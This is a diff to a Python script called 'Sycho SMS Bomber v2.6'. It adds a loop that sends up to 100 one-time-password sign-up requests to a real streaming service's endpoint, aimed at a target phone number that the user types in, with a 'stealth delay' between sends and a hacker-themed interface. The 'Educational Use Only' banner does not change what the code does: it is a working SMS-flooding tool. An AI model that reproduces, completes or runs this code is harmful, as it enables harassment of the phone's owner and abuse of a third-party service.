@@ -41,18 +41,18 @@ def display_banner():
 {Back.BLACK + Fore.RED + Style.BRIGHT}* *                                                        *
 {Back.BLACK + Fore.RED + Style.BRIGHT}* *                                                        *
 {Back.BLACK + Fore.RED + Style.BRIGHT}* **********************************************************
-{Back.BLACK + Fore.RED + Style.BRIGHT}   ____  _   _ _________ _       
-{Back.BLACK + Fore.RED + Style.BRIGHT}  / ___|| | | |__  / ___| |___  
-{Back.BLACK + Fore.RED + Style.BRIGHT}  \___ \| |_| | / /| |   | / __| 
-{Back.BLACK + Fore.RED + Style.BRIGHT}   ___) |  _  |/ /_| |___| \__ \ 
-{Back.BLACK + Fore.RED + Style.BRIGHT}  |____/|_| |_|____\____|_|___/
-{Back.BLACK + Fore.RED}═══════════════════════════════════════
+{Back.BLACK + Fore.RED + Style.BRIGHT}   \\____  _   _ _________ _       
+{Back.BLACK + Fore.RED + Style.BRIGHT}   / ___|| | | |__  / ___| |___  
+{Back.BLACK + Fore.RED + Style.BRIGHT}   \\___ \\| |_| | / /| |   | / __| 
+{Back.BLACK + Fore.RED + Style.BRIGHT}   ___) |  _  |/ /_| |___| \\__ \\ 
+{Back.BLACK + Fore.RED + Style.BRIGHT}   |____/|_| |_|____\\____|_|___/
+{Back.BLACK + Fore.RED}=======================================
 {Back.BLACK + Fore.RED}         SYCHO SMS BOMBER v2.6
-{Back.BLACK + Fore.RED}═══════════════════════════════════════
+{Back.BLACK + Fore.RED}=======================================
 {Back.BLACK + Fore.RED + Style.DIM}   Coded by SychoX2006 - 2025       {Style.RESET_ALL}
 {Back.BLACK + Fore.RED + Style.DIM}   Purpose: Advanced OTP Testing    {Style.RESET_ALL}
 {Back.BLACK + Fore.RED + Style.DIM}   ⚠️ Educational Use Only!         {Style.RESET_ALL}
-{Back.BLACK + Fore.RED}═══════════════════════════════════════
+{Back.BLACK + Fore.RED}=======================================
 {Style.RESET_ALL}"""
     print(banner)
     log_action("Banner displayed. Operation initialized.")
@@ -109,4 +109,56 @@ def send_otp(phone, count):
                     "ProductId": 1733,
                     "MobileNo": phone,
                     "OperatorId": "100007",
-                    "URL
+                    "URL": "https://www.tapmad.com/sign-up",
+                    "source": "organic",
+                    "medium": "organic"
+                }
+                response = requests.post(url, headers=headers, json=payload)
+            
+            success_count += 1
+            print(f"{Fore.GREEN}✅ OTP {i + 1}/{count} deployed. Status: {response.status_code}{Style.RESET_ALL}")
+            log_action(f"OTP {i + 1}/{count} deployed successfully. Status: {response.status_code}")
+        except requests.RequestException as e:
+            print(f"{Fore.RED}⚠️ OTP {i + 1} failed: {e}{Style.RESET_ALL}")
+            log_action(f"OTP {i + 1} failed: {e}")
+        time.sleep(0.7)  # Stealth delay
+    log_action(f"Deployment complete. Success: {success_count}/{count}")
+
+    print(f"{Fore.GREEN}🎯 Mission complete. {success_count}/{count} OTPs deployed.{Style.RESET_ALL}")
+
+# Main function with pro-hacker workflow
+def main():
+    """Execute the SMS bomber with a professional hacker interface."""
+    if os.path.exists(LOG_FILE):
+        os.remove(LOG_FILE)  # Fresh log for new session
+    log_action("Sycho SMS Bomber v2.6 launched.")
+    display_banner()
+    if not check_key():
+        return
+    while True:
+        print(f"\n{Fore.RED}📱 Enter Target Phone Number (+923xxxxxxxxx): {Style.RESET_ALL}")
+        phone = input().strip()
+        print(f"{Fore.RED}🔢 Enter OTP Count (1-100): {Style.RESET_ALL}")
+        try:
+            count = int(input())
+            send_otp(phone, count)
+        except ValueError:
+            print(f"{Fore.RED}❌ Invalid input detected. Enter a numeric value.{Style.RESET_ALL}")
+            log_action("Invalid input detected during OTP count entry.")
+        print(f"\n{Fore.YELLOW}🔥 Continue operation? (y/n): {Style.RESET_ALL}")
+        if input().lower() != 'y':
+            print(f"{Fore.CYAN}👋 Exfiltration successful. Stay undetectable, SychoX2006.{Style.RESET_ALL}")
+            log_action("Operation terminated by user.")
+            break
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{Fore.RED}🚨 Operation aborted. Cleaning tracks...{Style.RESET_ALL}")
+        log_action("Operation aborted by user.")
+        sys.exit(0)
+    except Exception as e:
+        print(f"{Fore.RED}❌ Critical failure: {e}. Erasing evidence...{Style.RESET_ALL}")
+        log_action(f"Critical failure: {e}")
+        sys.exit(1)
